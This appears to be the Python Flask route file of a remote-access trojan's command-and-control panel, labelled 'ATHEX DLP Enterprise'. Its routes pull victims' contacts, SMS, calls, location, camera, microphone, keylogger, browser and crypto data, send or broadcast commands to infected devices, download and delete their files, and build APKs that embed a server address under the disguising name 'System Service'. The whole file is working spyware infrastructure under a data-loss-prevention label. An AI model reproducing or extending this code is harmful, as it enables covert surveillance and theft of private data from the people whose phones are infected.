"""
ATHEX DLP Enterprise - Dashboard Routes
========================================
All web dashboard routes and API endpoints.
Handles page serving, API requests, and data flow.
"""

import os
import json
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, Any

from flask import (
    Blueprint, render_template, request, jsonify,
    send_file, redirect, url_for, current_app
)

logger = logging.getLogger(__name__)

# Create blueprint
dashboard_bp = Blueprint('dashboard', __name__, template_folder='../templates')

# ============================================================
# GLOBAL REFERENCES (set by app.py)
# ============================================================
tcp_server = None
device_manager = None
command_dispatcher = None
socket_manager = None
apk_builder = None
config = None

# Module handlers
contacts_handler = None
sms_handler = None
calls_handler = None
files_handler = None
location_handler = None
notifications_handler = None
clipboard_handler = None
apps_handler = None
camera_handler = None
microphone_handler = None
keylogger_handler = None
browser_handler = None
social_handler = None
crypto_handler = None
screen_handler = None


def init_dashboard(app, **kwargs):
    """Initialize dashboard with server components"""
    global tcp_server, device_manager, command_dispatcher
    global socket_manager, apk_builder, config
    global contacts_handler, sms_handler, calls_handler
    global files_handler, location_handler, notifications_handler
    global clipboard_handler, apps_handler, camera_handler
    global microphone_handler, keylogger_handler, browser_handler
    global social_handler, crypto_handler, screen_handler
    
    tcp_server = kwargs.get('tcp_server')
    device_manager = kwargs.get('device_manager')
    command_dispatcher = kwargs.get('command_dispatcher')
    socket_manager = kwargs.get('socket_manager')
    apk_builder = kwargs.get('apk_builder')
    config = kwargs.get('config')
    
    contacts_handler = kwargs.get('contacts_handler')
    sms_handler = kwargs.get('sms_handler')
    calls_handler = kwargs.get('calls_handler')
    files_handler = kwargs.get('files_handler')
    location_handler = kwargs.get('location_handler')
    notifications_handler = kwargs.get('notifications_handler')
    clipboard_handler = kwargs.get('clipboard_handler')
    apps_handler = kwargs.get('apps_handler')
    camera_handler = kwargs.get('camera_handler')
    microphone_handler = kwargs.get('microphone_handler')
    keylogger_handler = kwargs.get('keylogger_handler')
    browser_handler = kwargs.get('browser_handler')
    social_handler = kwargs.get('social_handler')
    crypto_handler = kwargs.get('crypto_handler')
    screen_handler = kwargs.get('screen_handler')
    
    app.register_blueprint(dashboard_bp)
    logger.info("Dashboard routes initialized")


# ============================================================
# PAGE ROUTES
# ============================================================

@dashboard_bp.route('/')
def index():
    """Main dashboard page"""
    return render_template('index.html', 
                          title=config.PROJECT_NAME if config else "ATHEX DLP",
                          version=config.VERSION if config else "2.0.0")


@dashboard_bp.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'service': 'ATHEX DLP Enterprise',
        'version': config.VERSION if config else '2.0.0',
        'timestamp': datetime.now().isoformat()
    })


# ============================================================
# DEVICE API ROUTES
# ============================================================

@dashboard_bp.route('/api/devices')
def api_get_devices():
    """Get all devices"""
    if not device_manager:
        return jsonify({'error': 'Device manager not initialized'}), 500
    
    online = [d.to_dict() for d in device_manager.get_online_devices()]
    offline = [d.to_dict() for d in device_manager.get_offline_devices()]
    
    return jsonify({
        'success': True,
        'online': online,
        'offline': offline,
        'online_count': len(online),
        'total_count': len(online) + len(offline),
        'stats': device_manager.get_stats()
    })


@dashboard_bp.route('/api/devices/<session_id>')
def api_get_device(session_id):
    """Get single device details"""
    if not device_manager:
        return jsonify({'error': 'Device manager not initialized'}), 500
    
    device = device_manager.get_device(session_id)
    if not device:
        return jsonify({'error': 'Device not found'}), 404
    
    return jsonify({
        'success': True,
        'device': device.to_dict()
    })


# ============================================================
# COMMAND API ROUTES
# ============================================================

@dashboard_bp.route('/api/command/send', methods=['POST'])
def api_send_command():
    """Send command to device"""
    if not command_dispatcher:
        return jsonify({'error': 'Command dispatcher not initialized'}), 500
    
    data = request.get_json()
    session_id = data.get('session_id')
    command_type = data.get('command')
    params = data.get('params', {})
    
    if not session_id or not command_type:
        return jsonify({'error': 'Missing session_id or command'}), 400
    
    from server.core.command_dispatcher import CommandType
    
    try:
        cmd_type = CommandType(command_type)
    except ValueError:
        return jsonify({'error': f'Unknown command: {command_type}'}), 400
    
    command = command_dispatcher.dispatch(
        command_type=cmd_type,
        target_session=session_id,
        params=params
    )
    
    if command:
        return jsonify({
            'success': True,
            'command': command.to_dict()
        })
    
    return jsonify({'error': 'Failed to dispatch command'}), 500


@dashboard_bp.route('/api/command/broadcast', methods=['POST'])
def api_broadcast_command():
    """Broadcast command to all devices"""
    if not command_dispatcher:
        return jsonify({'error': 'Command dispatcher not initialized'}), 500
    
    data = request.get_json()
    command_type = data.get('command')
    params = data.get('params', {})
    
    if not command_type:
        return jsonify({'error': 'Missing command'}), 400
    
    from server.core.command_dispatcher import CommandType
    
    try:
        cmd_type = CommandType(command_type)
    except ValueError:
        return jsonify({'error': f'Unknown command: {command_type}'}), 400
    
    results = command_dispatcher.dispatch_to_all(cmd_type, params)
    
    return jsonify({
        'success': True,
        'sent_count': len(results),
        'results': {sid: cmd.to_dict() for sid, cmd in results.items()}
    })


@dashboard_bp.route('/api/commands/available')
def api_available_commands():
    """Get list of available commands"""
    if not command_dispatcher:
        return jsonify({'error': 'Command dispatcher not initialized'}), 500
    
    return jsonify({
        'success': True,
        'commands': command_dispatcher.get_available_commands()
    })


@dashboard_bp.route('/api/commands/history')
def api_command_history():
    """Get command history"""
    if not command_dispatcher:
        return jsonify({'error': 'Command dispatcher not initialized'}), 500
    
    limit = request.args.get('limit', 50, type=int)
    
    return jsonify({
        'success': True,
        'history': command_dispatcher.get_command_history(limit)
    })


# ============================================================
# DATA API ROUTES
# ============================================================

@dashboard_bp.route('/api/data/<data_type>')
def api_get_data(data_type):
    """Get collected data for a device"""
    session_id = request.args.get('session_id')
    
    if not session_id:
        return jsonify({'error': 'Missing session_id parameter'}), 400
    
    handlers = {
        'contacts': contacts_handler,
        'sms': sms_handler,
        'calls': calls_handler,
        'files': files_handler,
        'location': location_handler,
        'notifications': notifications_handler,
        'clipboard': clipboard_handler,
        'apps': apps_handler,
        'camera': camera_handler,
        'microphone': microphone_handler,
        'keylogger': keylogger_handler,
        'browser': browser_handler,
        'social': social_handler,
        'crypto': crypto_handler,
        'screen': screen_handler,
    }
    
    handler = handlers.get(data_type)
    if not handler:
        return jsonify({'error': f'Unknown data type: {data_type}'}), 400
    
    try:
        if hasattr(handler, 'get_cached'):
            data = handler.get_cached(session_id)
        elif hasattr(handler, 'get_current'):
            data = handler.get_current(session_id)
        elif hasattr(handler, 'get_entries'):
            data = handler.get_entries(session_id)
        elif hasattr(handler, 'get_pending'):
            data = handler.get_pending(session_id)
        else:
            return jsonify({'error': 'Handler does not support retrieval'}), 400
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'data_type': data_type,
            'data': data,
            'count': len(data) if isinstance(data, list) else 1
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ============================================================
# FILE API ROUTES
# ============================================================

@dashboard_bp.route('/api/files/list')
def api_list_files():
    """Request file listing from device"""
    session_id = request.args.get('session_id')
    path = request.args.get('path', '/sdcard/')
    
    if not session_id:
        return jsonify({'error': 'Missing session_id'}), 400
    
    if command_dispatcher:
        from server.core.command_dispatcher import CommandType
        command_dispatcher.dispatch(
            CommandType.LIST_FILES, session_id, {'path': path}
        )
    
    return jsonify({
        'success': True,
        'message': f'File listing requested for {path}'
    })


@dashboard_bp.route('/api/files/download')
def api_download_file():
    """Download file from device"""
    session_id = request.args.get('session_id')
    file_path = request.args.get('path')
    
    if not session_id or not file_path:
        return jsonify({'error': 'Missing parameters'}), 400
    
    if command_dispatcher:
        from server.core.command_dispatcher import CommandType
        command_dispatcher.dispatch(
            CommandType.DOWNLOAD_FILE, session_id, {'path': file_path}
        )
    
    return jsonify({
        'success': True,
        'message': f'Download requested for {file_path}'
    })


@dashboard_bp.route('/api/files/delete', methods=['POST'])
def api_delete_file():
    """Delete file on device"""
    data = request.get_json()
    session_id = data.get('session_id')
    file_path = data.get('path')
    
    if not session_id or not file_path:
        return jsonify({'error': 'Missing parameters'}), 400
    
    if command_dispatcher:
        from server.core.command_dispatcher import CommandType
        command_dispatcher.dispatch(
            CommandType.DELETE_FILE, session_id, {'path': file_path}
        )
    
    return jsonify({
        'success': True,
        'message': f'Delete requested for {file_path}'
    })


@dashboard_bp.route('/api/files/download/<file_id>')
def api_get_downloaded_file(file_id):
    """Serve downloaded file"""
    if files_handler:
        file_path = files_handler.get_download_path(file_id)
        if file_path and file_path.exists():
            return send_file(file_path, as_attachment=True)
    
    return jsonify({'error': 'File not found'}), 404


# ============================================================
# APK BUILDER API ROUTES
# ============================================================

@dashboard_bp.route('/api/apk/build', methods=['POST'])
def api_build_apk():
    """Build custom APK"""
    if not apk_builder:
        return jsonify({'error': 'APK Builder not initialized'}), 500
    
    data = request.get_json()
    
    server_host = data.get('server_host', '127.0.0.1')
    server_port = data.get('server_port', 22533)
    app_name = data.get('app_name', 'System Service')
    features = data.get('features', None)
    
    try:
        result = apk_builder.build_apk(
            server_host=server_host,
            server_port=int(server_port),
            app_name=app_name,
            features=features
        )
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@dashboard_bp.route('/api/apk/download/<build_id>')
def api_download_apk(build_id):
    """Download built APK"""
    if not apk_builder:
        return jsonify({'error': 'APK Builder not initialized'}), 500
    
    apks = apk_builder.list_built_apks()
    for apk in apks:
        if build_id in apk['filename']:
            return send_file(apk['path'], as_attachment=True)
    
    return jsonify({'error': 'APK not found'}), 404


@dashboard_bp.route('/api/apk/list')
def api_list_apks():
    """List built APKs"""
    if not apk_builder:
        return jsonify({'error': 'APK Builder not initialized'}), 500
    
    return jsonify({
        'success': True,
        'apks': apk_builder.list_built_apks()
    })


# ============================================================
# SYSTEM API ROUTES
# ============================================================

@dashboard_bp.route('/api/system/stats')
def api_system_stats():
    """Get system statistics"""
    stats = {
        'timestamp': datetime.now().isoformat(),
        'version': config.VERSION if config else '2.0.0',
    }
    
    if tcp_server:
        stats['tcp_server'] = tcp_server.get_stats()
    
    if device_manager:
        stats['devices'] = device_manager.get_stats()
    
    if command_dispatcher:
        stats['commands'] = command_dispatcher.get_stats()
    
    if socket_manager:
        stats['websocket'] = socket_manager.get_stats()
    
    return jsonify({
        'success': True,
        'stats': stats
    })


@dashboard_bp.route('/api/system/config')
def api_get_config():
    """Get current configuration"""
    if config:
        return jsonify({
            'success': True,
            'config': config.to_dict()
        })
    
    return jsonify({'error': 'Config not available'}), 500


@dashboard_bp.route('/api/system/config', methods=['POST'])
def api_update_config():
    """Update configuration"""
    data = request.get_json()
    
    if config:
        for key, value in data.items():
            if hasattr(config, key.upper()):
                setattr(config, key.upper(), value)
        
        return jsonify({'success': True, 'message': 'Configuration updated'})
    
    return jsonify({'error': 'Config not available'}), 500